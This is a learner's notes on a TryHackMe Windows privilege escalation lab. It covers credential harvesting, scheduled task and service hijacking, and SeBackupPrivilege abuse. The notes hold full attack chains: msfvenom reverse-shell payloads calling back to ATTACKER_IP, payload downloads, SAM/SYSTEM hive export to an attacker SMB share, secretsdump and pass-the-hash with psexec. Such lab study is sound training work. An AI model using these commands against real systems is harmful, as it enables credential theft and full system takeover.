# Windows Privilege Escalation Notes.

> These are my personal cybersecurity learning notes written in my own words.
> I do not publish flags, direct answers, private-room solutions, or copied premium content.

## Platform

TryHackMe

## Topic

Windows Privilege Escalation

# Step 1:

First, connect to the box using the given box IP.

```bash
xfreerdp /v:xx:xx:xx:xx(your_Box_IP) /u:name /p:password/
```

# Step 2:

## Task 3: Harvesting Passwords from Usual Spots

### 1. A password for the julia.jones user has been left on the Powershell history. What is the password?

## Lesson:

The question mentioned that the password has been left in the Powershell history, so we can dump the Powershell history by using the following command:

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Mistake I made:

I first tried to dump the history in `cmd.exe` using:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

There is a slight change in the command. `$Env:userprofile` replaces `%userprofile%` in the header.

### 2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

## Lesson:

A quick way to find database connection strings on the system:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Just put the command in Powershell, and you will find the password.

### 3. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

## Lesson:

To spawn a shell for any user, we first list the admins using:

```cmd
cmdkey /list
```

Then we use:

```cmd
runas /savecred /user:adminname(required admin name) cmd.exe
```

That redirects to the admin’s machine. Then we can find the data, like the flag for this question.

So, I added two screenshots.

### 4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

## Lesson:

The question mentioned saved PuTTY sessions, so we will use the command:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

And we will get the password.

## End of Task 3

# Tags

#windows #privilege-escalation #tryhackme #crta-prep #redteam

## Task 4: Scheduled Tasks
### Note:

If you are using a Windows attack machine, you may need to install Nmap first, as Ncat is included with the Nmap installation. After installing Nmap, verify that Ncat is available:

```powershell
& "C:\Program Files (x86)\Nmap\ncat.exe" --version
```

If the command returns the Ncat version, you are ready to start a listener.

### Question

What is the taskusr1 flag?

### Lesson:

The objective was to abuse a scheduled task that runs with higher privileges.

First, I enumerated the scheduled tasks and found a task named `vulntask`.

```cmd
schtasks /query /tn vulntask /fo list /v
```

From the output, I identified:

```text
Task To Run: C:\tasks\schtask.bat
Run As User: taskusr1
```

This indicated that the task executes a batch file and runs as the `taskusr1` user.

Next, I checked the permissions on the batch file and found that it was writable by normal users. Since the scheduled task executes this file, modifying it would allow me to run commands as `taskusr1`.

I then started a Netcat listener on my attack machine:

```powershell
& "C:\Program Files (x86)\Nmap\ncat.exe" -lvp 4444
```

After triggering the scheduled task, I received a reverse shell connection. Once connected, I verified the user context:

```cmd
whoami
```

Output:

```text
wprivesc1\taskusr1
```

I then navigated to the Desktop of the `taskusr1` user and retrieved the flag.

### Key Takeaway:

When enumerating Windows scheduled tasks, always check:

* Which file the task executes.
* Which user executes the task.
* Whether the executable or script is writable by low-privileged users.

If a writable file is executed by a higher-privileged account, it may lead to privilege escalation.

### Answer

```text
THM{T***_C*******}
```

### Tags

#windows #privilege-escalation #scheduled-tasks #tryhackme #crta-prep #redteam

## End of Task 4


# Task 5: Abusing Service Misconfigurations
---

# Simple Overview

This task was about **Windows Services privilege escalation**.

A Windows service is a background program that runs on Windows. Some services run with higher privileges than a normal user, such as:

```text
LocalSystem
Administrator
Service user accounts
```

The main idea is simple:

If a low-privileged user can control the service file, service path, or service configuration, then that user may be able to make the service run their own payload with higher privileges.

In this task, there were three main attack types:

```text
1. Insecure permissions on service executable
2. Unquoted service path
3. Insecure service permissions
```

---

# Important Terms

## Service

A service is a background program in Windows. It can start automatically or manually.

## SCM

SCM means **Service Control Manager**.

It manages Windows services. It can start, stop, check, and configure services.

## Service executable

This is the `.exe` file that the service runs.

Example:

```text
C:\Program Files\SomeApp\service.exe
```

## Service account

This is the user account that runs the service.

Example:

```text
LocalSystem
.\svcuser1
.\svcusr2
```

## DACL

DACL means **Discretionary Access Control List**.

In simple words, DACL tells who has permission to do something.

For a service, DACL can control who can:

```text
start the service
stop the service
query the service
change the service configuration
```

For a file, DACL can control who can:

```text
read the file
write the file
modify the file
execute the file
```

## BINARY_PATH_NAME

This shows the executable path used by a service.

Example:

```text
BINARY_PATH_NAME : C:\Program Files\App\service.exe
```

## SERVICE_START_NAME

This shows which account runs the service.

Example:

```text
SERVICE_START_NAME : LocalSystem
```

## LocalSystem

LocalSystem is a very high-privileged Windows account.

If I get a shell as LocalSystem, I have very powerful access on the machine.

---

# Attack 1: Insecure Permissions on Service Executable

## Easy explanation

In this attack, the service runs an `.exe` file.

If a normal user can modify or replace that `.exe` file, then we can replace the original service executable with our own payload.

When the service starts, Windows will run our payload instead of the original service file.

Simple idea:

```text
Original service file:
WService.exe

We rename it as backup:
WService.exe.bkp

Then we put our payload there and rename it:
WService.exe
```

So Windows thinks it is running the real service file, but actually it is running our payload.

---

## Commands Used

### Check the service configuration

Used in: **Command Prompt / CMD**

```cmd
sc qc WindowsScheduler
```

This command shows service information like:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
```

The important things I checked were:

```text
Which executable the service runs
Which user account the service runs as
```

---

### Check file permissions

Used in: **Command Prompt / CMD**

```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

`icacls` shows permissions on files or folders.

If I see something like:

```text
Everyone:(M)
```

That means Everyone has Modify permission.

This is dangerous because a normal user can modify the service executable.

---

### Create service payload

Used in: **Kali Linux**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

Explanation:

```text
msfvenom = creates payload
windows/x64/shell_reverse_tcp = Windows reverse shell payload
LHOST = my Kali VPN IP
LPORT = listening port
-f exe-service = creates a service-compatible exe
-o rev-svc.exe = output file name
```

---

### Start Python web server

Used in: **Kali Linux**

```bash
python3 -m http.server
```

This hosts the payload so I can download it from the Windows target machine.

---

### Download payload

Used in: **PowerShell**

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

This downloads the payload from my Kali machine to the Windows target.

---

### Replace the service executable

Used in: **Command Prompt / CMD**

```cmd
cd C:\PROGRA~2\SYSTEM~1\
```

Go to the folder where the original service executable exists.

```cmd
move WService.exe WService.exe.bkp
```

This renames the original file as a backup.

```cmd
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```

This moves my payload to the service folder and renames it to the original service executable name.

```cmd
icacls WService.exe /grant Everyone:F
```

This gives full permission to Everyone so the service can execute the new file.

---

### Start listener

Used in: **Kali Linux**

```bash
nc -lvp 4445
```

This listens for the reverse shell connection.

---

### Restart the service

Used in: **Command Prompt / CMD**

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

When the service starts again, it runs my replaced executable.

---

## Lesson Learned

If the service executable has weak permissions, we can replace the original `.exe` with our payload.

The service path stays the same, but the file at that path is now our payload.

Simple meaning:

```text
We do not change the service path.
We change the file that the service path points to.
```

---

# Attack 2: Unquoted Service Path

## Easy explanation

This attack happens when a Windows service executable path has spaces but does not use quotation marks.

Correct example:

```cmd
"C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
```

Wrong/vulnerable example:

```cmd
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Because there are spaces in the path, Windows may become confused and try to execute files step by step.

It may check:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

So if I can create this file:

```text
C:\MyPrograms\Disk.exe
```

Windows may run my payload before it runs the real service executable.

---

## Commands Used

### Check the service path

Used in: **Command Prompt / CMD**

```cmd
sc qc "disk sorter enterprise"
```

The important thing I checked was:

```text
BINARY_PATH_NAME
```

The service path was unquoted and had spaces.

That made it vulnerable.

---

### Check folder permissions

Used in: **Command Prompt / CMD**

```cmd
icacls c:\MyPrograms
```

This checks whether normal users can write inside the folder.

If users can write there, then we can place our payload in that path.

---

### Create service payload

Used in: **Kali Linux**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```

This creates a second service-compatible reverse shell payload.

---

### Start listener

Used in: **Kali Linux**

```bash
nc -lvp 4446
```

This listens for the reverse shell connection.

---

### Move payload to the hijack path

Used in: **Command Prompt / CMD or PowerShell**

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

Meaning:

```text
Take rev-svc2.exe from the user folder
Move it to C:\MyPrograms\
Rename it as Disk.exe
```

Before:

```text
C:\Users\thm-unpriv\rev-svc2.exe
```

After:

```text
C:\MyPrograms\Disk.exe
```

Why `Disk.exe`?

Because Windows checks `C:\MyPrograms\Disk.exe` first because of the unquoted path.

---

### Give permission to payload

Used in: **Command Prompt / CMD or PowerShell**

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

This gives full permission to Everyone.

---

### Restart the service

Used in: **Command Prompt / CMD**

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

If using **PowerShell**, I should use:

```powershell
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```

---

## Mistake I Made

I used `sc` inside PowerShell.

In PowerShell:

```text
sc = Set-Content
```

So when I typed:

```powershell
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

PowerShell did not stop or start the service.

It created files named:

```text
stop
start
```

Correct command in PowerShell:

```powershell
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```

Lesson:

```text
In CMD, use sc.
In PowerShell, use sc.exe.
```

---

## Another Mistake I Made

I moved the payload wrongly at first.

The correct command was:

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

The important point is that the final file must exist here:

```text
C:\MyPrograms\Disk.exe
```

Not here:

```text
C:\MyPrograms\Disk Sorter Enterprise\Disk.exe
```

Not only here:

```text
C:\Users\thm-unpriv\rev-svc2.exe
```

The final hijack file must be exactly:

```text
C:\MyPrograms\Disk.exe
```

---

## Lesson Learned

Unquoted service path attack depends on two things:

```text
1. The service path has spaces and no quotation marks.
2. I can write a payload in one of the paths Windows checks first.
```

Simple meaning:

```text
Windows gets confused by the spaces.
I place my payload where Windows checks first.
Then the service runs my payload.
```

---

# Attack 3: Insecure Service Permissions

## Easy explanation

In this attack, I may not be able to replace the service executable.

The service path may also be properly quoted.

But if the service permission is weak, I can change the service configuration itself.

That means I can tell Windows:

```text
Do not run the original service executable.
Run my payload instead.
Run it as LocalSystem.
```

This is very powerful because LocalSystem is highly privileged.

---

## Commands Used

### Check service permissions

Used in: **Command Prompt / CMD**

```cmd
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

`AccessChk` is a Sysinternals tool used to check permissions.

The important permission was:

```text
SERVICE_ALL_ACCESS
```

If normal users have `SERVICE_ALL_ACCESS`, they can reconfigure the service.

---

### Create payload

Used in: **Kali Linux**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

This creates another service-compatible reverse shell payload.

---

### Start listener

Used in: **Kali Linux**

```bash
nc -lvp 4447
```

This waits for the reverse shell connection.

---

### Transfer payload to Windows

Used in: **PowerShell**

```powershell
wget http://ATTACKER_IP:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe
```

I should save the file in the user folder because a low-privileged user may not have permission to write directly in `C:\`.

Good path:

```text
C:\Users\thm-unpriv\rev-svc3.exe
```

Bad path:

```text
C:\rev-svc3.exe
```

---

### Give permission to payload

Used in: **Command Prompt / CMD or PowerShell**

```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

This gives Everyone permission to execute the payload.

---

### Change service configuration

Used in: **Command Prompt / CMD**

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Meaning:

```text
binPath= changes the executable path of the service
obj= LocalSystem makes the service run as LocalSystem
```

Important:

There must be a space after the equal sign.

Correct:

```cmd
binPath= "C:\Users\thm-unpriv\rev-svc3.exe"
```

Wrong:

```cmd
binPath="C:\Users\thm-unpriv\rev-svc3.exe"
```

If using **PowerShell**, use:

```powershell
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

---

### Start or restart the service

Used in: **Command Prompt / CMD**

```cmd
sc stop THMService
sc start THMService
```

If the service is already stopped, this message can appear:

```text
[SC] ControlService FAILED 1062:
The service has not been started.
```

That simply means:

```text
The service was already stopped.
```

In that case, just start it:

```cmd
sc start THMService
```

---

## Issue I Faced

I followed the steps and got:

```text
[SC] ChangeServiceConfig SUCCESS
```

That means the service configuration was changed successfully.

Then I got:

```text
[SC] ControlService FAILED 1062:
The service has not been started.
```

This was not a big problem. It only meant the service was already stopped.

After starting the service, I saw:

```text
STATE : START_PENDING
```

This means Windows tried to start the service payload.

However, my reverse shell did not connect back.

Possible reasons:

```text
The payload was broken from previous attempts
The service was stuck from previous wrong commands
The wrong port was used
The payload LHOST was wrong before
The lab machine became messy after many failed attempts
```

---

## Important Network Lesson

My Kali VPN IP was under `tun0`.

Example:

```text
tun0 inet 192.168.143.211
```

So my payload should use:

```bash
LHOST=192.168.143.211
```

Example:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.143.211 LPORT=4447 -f exe-service -o rev-svc3.exe
```

Then the listener must use the same port:

```bash
nc -lvnp 4447
```

---

## PowerShell vs CMD Lesson

One of the biggest lessons from this task:

In **CMD**, this works:

```cmd
sc start THMService
```

But in **PowerShell**, `sc` is an alias for `Set-Content`.

So in PowerShell, I must use:

```powershell
sc.exe start THMService
```

Same for stop and config:

```powershell
sc.exe stop THMService
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

---

# Final Summary

This task taught me three Windows service privilege escalation methods.

## 1. Insecure Service Executable Permission

Problem:

```text
Normal users can modify the service executable.
```

What we do:

```text
Replace the original service executable with our payload.
```

Result:

```text
Payload runs as the service account.
```

---

## 2. Unquoted Service Path

Problem:

```text
The service path has spaces but no quotes.
```

What we do:

```text
Place our payload in a path Windows checks first.
```

Result:

```text
Windows accidentally runs our payload.
```

---

## 3. Insecure Service Permissions

Problem:

```text
Normal users can change the service configuration.
```

What we do:

```text
Change the service binPath to our payload and run it as LocalSystem.
```

Result:

```text
Payload should run with SYSTEM privileges.
```

---

# Tools Used

## Kali Linux

```text
msfvenom
python3 http.server
netcat / nc
```

## Windows CMD

```text
sc
icacls
move
dir
cd
accesschk64.exe
```

## Windows PowerShell

```text
wget
sc.exe
Test-NetConnection
```

---

# My Main Mistakes

```text
1. I used sc inside PowerShell instead of sc.exe.
2. I accidentally created files named start and stop because PowerShell treated sc as Set-Content.
3. I got confused about where to move the payload for the unquoted service path attack.
4. I tried saving a downloaded file directly in C:\, but access was denied.
5. I learned that payload LHOST must be the Kali VPN/tun0 IP.
6. I learned that if the lab becomes messy after many failed attempts, resetting the box is sometimes the cleanest fix.
```

---

# My Main Lesson

Windows service privilege escalation is about checking:

```text
Who can modify the service executable?
Is the service path quoted properly?
Who can change the service configuration?
Which account runs the service?
```

If a low-privileged user can control any of these areas, privilege escalation may be possible.

The most important command habit I learned:

```text
Use sc in CMD.
Use sc.exe in PowerShell.
```

# Task 6: Windows Privileges
##SeBackup / SeRestore

> These are my personal cybersecurity learning notes written in my own words.
> I do not publish flags, direct answers, private-room solutions, copied premium content, machine-specific passwords, or real secrets.

## Platform

TryHackMe

## Topic

Windows Privilege Escalation - Windows Privileges

## Covered in this note

```text
SeBackupPrivilege
SeRestorePrivilege
```

The rest will be added later:

```text
SeTakeOwnershipPrivilege
SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```

---

# Simple Explanation

Windows privileges are special rights given to a user account.

Normal file permissions decide who can read, write, or execute files.

But Windows privileges are more powerful. They allow users to perform system-level actions like:

```text
Shutting down the machine
Backing up files
Restoring files
Taking ownership of files
Impersonating another user
Bypassing some permission checks
```

To check the privileges of the current user, we use:

```cmd
whoami /priv
```

---

# What is SeBackupPrivilege?

`SeBackupPrivilege` allows a user to back up files and directories.

In simple words:

```text
It allows a user to read/copy files even if normal permissions do not allow it.
```

This privilege is normally given to backup-related users because they need to copy important system files without being full administrators.

But from an attacker’s point of view, this is dangerous because sensitive Windows files can be copied.

---

# What is SeRestorePrivilege?

`SeRestorePrivilege` allows a user to restore files and directories.

In simple words:

```text
It allows a user to write/restore files while bypassing some normal file permissions.
```

Together, `SeBackupPrivilege` and `SeRestorePrivilege` are powerful because they can help access protected system data.

---

# What was the target idea?

The idea was:

```text
Use SeBackupPrivilege to copy the SAM and SYSTEM registry hives.
Then extract the local Administrator password hash.
Then use Pass-the-Hash to get access as Administrator/SYSTEM.
```

---

# Important Terms

## SAM

SAM means **Security Account Manager**.

In simple words:

```text
SAM stores local Windows user password hashes.
```

Example local users:

```text
Administrator
Guest
THMBackup
THMTakeOwnership
```

SAM does not store plain-text passwords. It stores password hashes.

---

## SYSTEM hive

The SYSTEM registry hive contains important system information needed to extract/decrypt the hashes from SAM.

So we need both files:

```text
SAM + SYSTEM = local password hash extraction
```

That is why we saved both:

```text
sam.hive
system.hive
```

---

## Hash

A hash is like a protected version of a password.

Example idea:

```text
Password  →  Hash
```

In some Windows attacks, we do not need to know the real password. We can use the hash directly.

---

## Pass-the-Hash

Pass-the-Hash means:

```text
Login using the password hash instead of the real password.
```

So if we get the Administrator hash, we can try to login as Administrator using that hash.

---

# Step 1: Login with the given user

The user used in this task was:

```text
THMBackup
```

This user is part of the **Backup Operators** group.

The Backup Operators group can have:

```text
SeBackupPrivilege
SeRestorePrivilege
```

---

# Step 2: Open CMD as administrator

This part is important.

To use the backup/restore privileges properly, I had to open Command Prompt using:

```text
Run as administrator
```

Then Windows asked for the user password again.

---

# Step 3: Check privileges

Used in: **Windows CMD**

```cmd
whoami /priv
```

## Lesson

This command shows what privileges the current user has.

I looked for:

```text
SeBackupPrivilege
SeRestorePrivilege
```

Even if the privilege state shows `Disabled`, the privilege is still assigned to the user.

---

# Step 4: Why did we jump to `reg save`?

At first, this part confused me.

The command was:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

## Explanation

We jumped to `reg save` because the goal was to copy the protected registry hives.

The important registry hives were:

```text
HKLM\SYSTEM
HKLM\SAM
```

But instead of directly copying locked system files, we used `reg save`.

`reg save` exports/saves a registry hive into a file.

So:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

means:

```text
Take the SYSTEM registry hive and save it as system.hive inside C:\Users\THMBackup\
```

And:

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

means:

```text
Take the SAM registry hive and save it as sam.hive inside C:\Users\THMBackup\
```

## Why the path was used

The output files were saved in:

```text
C:\Users\THMBackup\
```

because this is the user’s folder, and the user can write files there.

So the full output paths became:

```text
C:\Users\THMBackup\system.hive
C:\Users\THMBackup\sam.hive
```

---

# Step 5: Save the SAM and SYSTEM hives

Used in: **Windows CMD**

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

## Lesson

These commands created two files:

```text
system.hive
sam.hive
```

These files were needed to extract local Windows user password hashes later.

---

# Step 6: Start SMB server on Kali

The TryHackMe command was:

```bash
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

## Problem I faced

In my Kali machine, I did not have:

```text
python3.9
```

And I also did not have this path:

```text
/opt/impacket/examples/smbserver.py
```

So the THM command did not match my Kali setup.

## What I did

I searched for the modern Impacket SMB server command using:

```bash
which impacket-smbserver
```

Used in: **Kali Linux**

```bash
which impacket-smbserver
```

I found:

```text
/usr/bin/impacket-smbserver
```

So instead of using the old THM path, I used the modern Kali command.

---

# Step 7: Create a share folder

Used in: **Kali Linux**

```bash
mkdir -p share
```

## Meaning

This created a folder named:

```text
share
```

This folder was used to receive files from the Windows target.

---

# Step 8: Run Impacket SMB server

Used in: **Kali Linux**

```bash
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

or with full path:

```bash
/usr/bin/impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

## Explanation

```text
impacket-smbserver = starts an SMB file server
-smb2support = enables SMB2 support
-username THMBackup = username required to access the share
-password CopyMaster555 = password required to access the share
public = share name
share = local folder on Kali
```

## Important lesson

When the SMB server starts, it may look stuck.

But it is not stuck.

It is waiting for the Windows machine to connect.

So I had to keep that terminal open.

---

# Step 9: Copy SAM hive to Kali

Used in: **Windows CMD**

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```

In my case, I used my Kali VPN IP:

```cmd
copy C:\Users\THMBackup\sam.hive \\192.168.143.211\public\
```

## Lesson

The `sam.hive` file was small, so it copied easily using normal `copy`.

---

# Step 10: Problem copying system.hive

The `system.hive` file was bigger than `sam.hive`.

Normal copy caused disturbance/network error for me.

The `sam.hive` copied perfectly, but `system.hive` kept causing problems.

## Mistake / Issue I faced

I first tried normal copy:

```cmd
copy C:\Users\THMBackup\system.hive \\192.168.143.211\public\
```

But it caused network issues and corrupted/incomplete copy.

When I tried to run `secretsdump`, I got errors because `system.hive` was not copied properly.

---

# Step 11: Use robocopy for system.hive

To fix the problem, I used `robocopy`.

Used in: **Windows CMD**

```cmd
robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
```

## Explanation

```text
robocopy = robust file copy tool
C:\Users\THMBackup = source folder
\\192.168.143.211\public = Kali SMB share
system.hive = file to copy
/Z = restartable mode
/R:5 = retry 5 times
/W:2 = wait 2 seconds between retries
```

## Why I used robocopy

I used `robocopy` because `system.hive` was bigger and normal `copy` was failing.

`robocopy` is better for larger or unstable file transfers.

---

# Robocopy mistake I made

At first, I used wrong robocopy syntax:

```cmd
robocopy C:\Users\THMBackup\system.hive \\192.168.143.211\public\
```

This was wrong because `robocopy` expects:

```text
robocopy SOURCE_FOLDER DESTINATION_FOLDER FILE_NAME
```

Correct command:

```cmd
robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
```

## Lesson

Wrong:

```text
Source = C:\Users\THMBackup\system.hive
```

Correct:

```text
Source folder = C:\Users\THMBackup
File name = system.hive
```

---

# Step 12: Check files on Kali

Used in: **Kali Linux**

```bash
ls -lh ~/share
```

I checked that both files existed:

```text
sam.hive
system.hive
```

The `system.hive` file was much bigger than `sam.hive`.

---

# Step 13: Dump hashes using secretsdump

Used in: **Kali Linux**

```bash
impacket-secretsdump -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
```

## Explanation

```text
impacket-secretsdump = Impacket tool to dump hashes/secrets
-sam ~/share/sam.hive = path to SAM hive
-system ~/share/system.hive = path to SYSTEM hive
LOCAL = offline local dump
```

## Lesson

This command extracted local Windows user password hashes.

The important hash was the Administrator hash.

For public notes, I will not publish the real hash.

---

# Step 14: Pass-the-Hash with Administrator hash

After extracting the Administrator hash, we can use Pass-the-Hash.

Used in: **Kali Linux**

```bash
impacket-psexec -hashes LMHASH:NTHASH administrator@TARGET_IP
```

## Explanation

```text
impacket-psexec = tool to execute commands remotely on Windows
-hashes = use password hash instead of password
LMHASH:NTHASH = hash format from secretsdump
administrator@TARGET_IP = login as Administrator to the target machine
```

## Important mistake to avoid

Do not copy the example hash from TryHackMe.

Use the hash from your own `secretsdump` output.

The format is:

```text
LMHASH:NTHASH
```

For public writeups, I will write:

```text
LMHASH:ADMIN_NT_HASH
```

instead of publishing the real hash.

---

# Step 15: Confirm SYSTEM shell

After successful Pass-the-Hash, I checked:

Used in: **Windows shell from psexec**

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

That means I successfully got SYSTEM-level access.

---

# Step 16: Flag location

The flag was located on the Administrator Desktop.

Used in: **Windows shell from psexec**

```cmd
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```

For public writeups, I will not publish the flag.

---

# Full Command Flow

## Windows CMD - Check privileges

```cmd
whoami /priv
```

## Windows CMD - Save hives

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

## Kali Linux - Find Impacket SMB server

```bash
which impacket-smbserver
```

## Kali Linux - Start SMB server

```bash
mkdir -p share
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

## Windows CMD - Copy SAM hive

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```

## Windows CMD - Copy SYSTEM hive with robocopy

```cmd
robocopy C:\Users\THMBackup \\ATTACKER_IP\public system.hive /Z /R:5 /W:2
```

## Kali Linux - Check received files

```bash
ls -lh ~/share
```

## Kali Linux - Dump hashes

```bash
impacket-secretsdump -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
```

## Kali Linux - Pass-the-Hash

```bash
impacket-psexec -hashes LMHASH:NTHASH administrator@TARGET_IP
```

## Windows shell - Confirm privilege

```cmd
whoami
```

## Windows shell - Read flag

```cmd
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```

---

# Problems I Faced

## Problem 1: THM Impacket path did not exist

THM used:

```bash
python3.9 /opt/impacket/examples/smbserver.py
```

But I did not have Python 3.9 or that Impacket examples path.

## Fix

I used:

```bash
which impacket-smbserver
```

Then used:

```bash
impacket-smbserver
```

directly.

---

## Problem 2: I accidentally tried to run impacket-smbserver with python3

Wrong:

```bash
python3 /usr/bin/impacket-smbserver
```

This caused a syntax error because `impacket-smbserver` is not a normal Python file in my Kali setup.

Correct:

```bash
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

---

## Problem 3: SMB server looked stuck

When I ran `impacket-smbserver`, it showed the banner and waited.

At first, it looked stuck.

But it was normal.

The SMB server was waiting for the Windows target to copy files.

---

## Problem 4: I typed the SMB IP path wrong

Wrong:

```cmd
\\192.168.143\211\public\
```

Correct:

```cmd
\\192.168.143.211\public\
```

The full IP must stay together:

```text
192.168.143.211
```

---

## Problem 5: system.hive copy kept failing

`sam.hive` copied easily, but `system.hive` caused network error because it was bigger.

## Fix

I used:

```cmd
robocopy C:\Users\THMBackup \\192.168.143.211\public system.hive /Z /R:5 /W:2
```

---

## Problem 6: Linux filename case sensitivity

At one point, the file was saved as:

```text
System.hive
```

But I typed:

```text
system.hive
```

Linux is case-sensitive.

So these are different:

```text
System.hive
system.hive
```

---

## Problem 7: secretsdump failed because system.hive was corrupted

Because the first copy of `system.hive` failed, `secretsdump` gave errors.

## Fix

I copied `system.hive` again properly using `robocopy`.

Then `secretsdump` worked.

---

# Key Lessons

```text
1. SeBackupPrivilege lets us copy protected files.
2. SAM contains local user password hashes.
3. SYSTEM hive is needed to extract/decrypt the SAM hashes.
4. reg save is used to export protected registry hives into files.
5. Impacket paths may differ depending on Kali version.
6. Modern Kali can use impacket-smbserver directly.
7. Large files may fail with normal copy, so robocopy is better.
8. Linux filenames are case-sensitive.
9. Do not use THM example hashes; use your own dumped hash.
10. Pass-the-Hash can give SYSTEM access using the Administrator hash.
```

---
